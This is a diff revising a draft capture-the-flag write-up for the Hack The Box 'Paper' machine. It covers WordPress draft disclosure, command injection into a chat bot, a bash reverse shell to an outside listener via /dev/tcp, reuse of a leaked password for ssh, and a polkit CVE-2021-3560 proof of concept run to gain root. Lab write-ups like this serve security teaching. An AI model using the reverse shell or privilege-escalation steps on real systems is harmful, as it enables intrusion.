@@ -40,6 +40,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 38.28 seconds
 ```
 It seems like we have a webserver at port 80 and 443. So while checking this out in firefox, we will also start a dirb scan to have some further enumeration in the background.
+
+
+![HTTP Server](https://i.imgur.com/ULrn1m0.jpg?1)
+
+
 ```
 ┌──(kali㉿kali)-[~/Documents/htb/paper]
 └─$ dirb http://10.10.11.143 
@@ -96,8 +101,7 @@ So lets add this to /etc/hosts, then we will be able to see the contents of that
 127.0.1.1       kali
 10.10.11.143    office.paper
 ```
-<----------BILDE---------->
-
+![WordpressPage](https://i.imgur.com/xFk3AaV.png)
 Success, we get a wordpress page. 
 
 ## Wordpress exploits
@@ -147,32 +151,13 @@ Here are a few ways to manipulate the returned entries:
 - `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format
 In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:
 ```
-So just by appending ?static=1 to the end of the url, we get to see all of the content. 
-<-------------------
-http://office.paper/?static=1
+So just by appending ?static=1 to the end of the url, we get to see all of the content. `http://office.paper/?static=1`
+![offfice paper static](https://i.imgur.com/vd6Huan.png)
 
 
-```bash
-test
-Micheal please remove the secret from drafts for gods sake!
-Hello employees of Blunder Tiffin,
-Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.
-So, I kindly request you all to take your discussions from the public blog to a more private chat system.
--Nick
-# Warning for Michael
-Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick
-Threat Level Midnight
-A MOTION PICTURE SCREENPLAY,
-WRITTEN AND DIRECTED BY
-MICHAEL SCOTT
-[INT:DAY]
-Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….
-# Secret Registration URL of new Employee chat system
-http://chat.office.paper/register/8qozr226AhkCHZdyY
-# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
-# Also, stop looking at my drafts. Jeez!
-```
-If we were to read some of the posts we would see the hint of unsecure drafts. But we got a new link. This points us to chat.office.paper. So lets again, add that to /etc/hosts and see what we get.
+
+If we were to read some of the posts we would see the hint of unsecure drafts. But we got a new link `http://chat.office.paper/register/8qozr226AhkCHZdyY`
+. This points us to chat.office.paper. So lets again, add that to /etc/hosts and see what we get.
 ```bash
 ┌──(kali㉿kali)-[~/Documents/htb/paper]
 └─$ sudo vim /etc/hosts
@@ -180,14 +165,17 @@ If we were to read some of the posts we would see the hint of unsecure drafts. B
 127.0.1.1       kali
 10.10.11.143    office.paper    chat.office.paper
 ```
-<------ bilde
-
+![chat register](https://i.imgur.com/5pSGxas.png)
 We get a register user and login page!
 
 # Chat
 
-So lets just register a user and check whats there.
+So lets just register a user and check whats there. It started as an empty page, but thats just becuase we havn't joined a chatroom yet.
+![general chatroom](https://i.imgur.com/oVrPTEw.png)
 
+Upon looking around in the general room it looks like Dwight has added a bot to answer any questions that anyone has. The general chatroom is a read only, so therefore lets just chat directly with the bot Recyclops
+
+```
 Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
 Most frequently asked questions include:
 - What time is it?
@@ -214,15 +202,33 @@ You can ask me what the time is
 eg: 'recyclops what time is it?' or just 'recyclops time'
 That's what I am capable of doing right now.
 Also, Dwight is a cool guy and not a Time Thief!
-
-
+```
+Hilarious, so it seems like you can ask him something and he will fetch files, tell jokes and list directories.
+When I see something like this i want to see what a legitimate call looks like and what a illigitimate one looks like.
+So if we ask him `list sale` he replys with:
+```bash
+<----------- INSERT RECYCLOPS answer------------>
+```
+But if we ask for something like `list sale; whoami`, then he simply replys with `STOP INJECTING OS COMMANDS`.
+Another function he adds is `file reports.txt`, then he cats the file.
+So we have two functions that each do `ls -la` and `cat`. 
+If you use the list function, it doesn't sanitize our input to remove things like `../`, so we can directory traverse the filesystem to poke around.
+...
+Why not try run?
+`run whoami` -> `Dwight`
+We have code execution!
 # Shell
+I set up my NC listener `nc -nvlp 8080`
+`run bash -i >& /dev/tcp/10.10.10.10/8080 0>&1`, we get shell!
+I do reccommend taking a look at https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet . He has gathered everything you need.
+
+So lets take a look at what we have, i run the env command to check out whats currently going on.
 
 ```bash
 ┌──(kali㉿kali)-[~/Documents/htb/paper]    
-└─$ nc -nvlp 6969                                                                                         
-listening on [any] 6969 ...                                                                               
-connect to [10.10.14.231] from (UNKNOWN) [10.10.11.143] 46252
+└─$ nc -nvlp 8080                                                                                         
+listening on [any] 8080 ...                                                                               
+connect to [10.10.10.10] from (UNKNOWN) [10.10.11.143] 46252
 [recyclops@paper]$ env                      
 RESPOND_TO_EDITED=true   
 ROCKETCHAT_USER=recyclops            
@@ -237,7 +243,7 @@ NCAT_REMOTE_ADDR=10.10.14.231
 RESPOND_TO_DM=true    
 PWD=/home/dwight/hubot
 HOME=/home/dwight                   
-NCAT_REMOTE_PORT=6969               
+NCAT_REMOTE_PORT=8080               
 PORT=8000                           
 NCAT_LOCAL_PORT=46252               
 ROCKETCHAT_PASSWORD=Queenofblad3s!23
@@ -252,22 +258,43 @@ NCAT_LOCAL_ADDR=10.10.11.143
 NCAT_PROTO=TCP
 ---
 ```
+As expected, i am the rocketchat user recyclops, listening at port 8000, and using a password Queenofblad3s!23. But mylogon name is dwight.
+So this might mean that we can log on dwights user using this password!
+Whenever we have the chance, switch from nc to ssh, becuase our shell is much more stable and we have tabcompleation and ctrl+c access.
+
 ## Upgrading our shell
+We try to ssh with the password we just found and we gain access!
 `ssh dwight@10.10.11.143 -p Queenofblad3s!23`
+When trying this box, i saw that the /home/dwight/hubot folder was beginning to be cluttered with a lot of file and such by other users. So i navigate to /dev/shm to create my own space to work from. Not only is this a filespace that is rarely used by others, it also is non persistant. So we can add stuff there that will not cause trouble for others.
+More info can be found here: https://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html
 
 # Enumeration
-Use linpeas
+As a rule of thumb, i try to manually enumerate some things first:
+```bash
+ls -la /etc/passwd
+cat /etc/passwd
+sudo -l
+find / -perm -u=s -type f 2>/dev/null
+ss -antlp
+ls -lah /etc/cron*
+++++
+```
+So manual enumeration is great, we have a lot of control over what we are looking at and for, but can be hard to master. So I reccomend using either ![LinEnum](https://github.com/rebootuser/LinEnum) or ![LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).
+I tried out linpeas becuase it is relativly new and seems to be the hottest thing on the market right now.
+The results from linpeas is massive, but one thing stood out.
 ```
 ╔══════════╣ Sudo version                             
 ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version 
 Sudo version 1.8.29                      
 Vulnerable to CVE-2021-3560
 ```
+The sudo version is vulnerable.
 
 # Privesc
-As it turns out it's vulnerable to the CVE-2021-3560, and the creator of the box has created a privesc POC that we can use. 
+As it turns out it's vulnerable to the CVE-2021-3560 which is a vulneralbility that allows the attacker to create a new admin. A brief summary is written ![here](https://access.redhat.com/security/cve/cve-2021-3560). But as a treat, the creator of the box has created a privesc POC that we can use. This definetly is the right way
 
 https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh
+The flow of the code is shown under, i won't comment too much on it as it explains well what its doing. The only problem i had was using the correct password. Therefore i added the -p flag to declare my own password. Bear in mind, the code says that you might need to run this exploit a couple of times, so don't worry.
 ```bash
 [dwight@paper shm]$ ./esc.sh -p=test123  
 [!] Username set as : secnigma           
@@ -299,5 +326,7 @@ Password:
 [root@paper secnigma]# whoami
 root
 ```
+We are root.
+
 # Final thoughts
-The best thing of this box is attempting to use linpeas, its an incredibly useful tool that will definetly come in handy.
+I hope you learned something. A classic thing in this box was thinking outside of the box. Virtual hosting can be hard to think about in the start, but it definetly is useful to hide pages or reroute traffic. And trying out linpeas was fun as it is a verry powerful and structured tool. I will definetly use this in the future.
